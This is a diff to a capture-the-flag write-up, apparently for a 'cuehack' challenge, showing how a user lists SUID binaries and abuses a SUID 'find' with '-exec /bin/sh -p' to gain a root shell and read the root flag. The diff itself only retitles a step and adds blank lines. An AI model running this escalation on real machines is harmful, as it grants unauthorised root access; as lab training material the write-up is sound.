@@ -76,7 +76,7 @@ cuehack{did_the_name_mislead_you?}
 
 No Sudo
 
-Check for SUID
+Check for SUID and get the win.
 
 ```
 john@70037aabe340:~$ find / -perm -4000 2>/dev/null
@@ -98,6 +98,8 @@ bash: ./find: No such file or directory
 john@70037aabe340:~$ find . -exec /bin/sh -p \; -quit
 # id
 uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)
+
+
 
 # cat /root/root.txt
 cuehack{so_you_found_it}# 
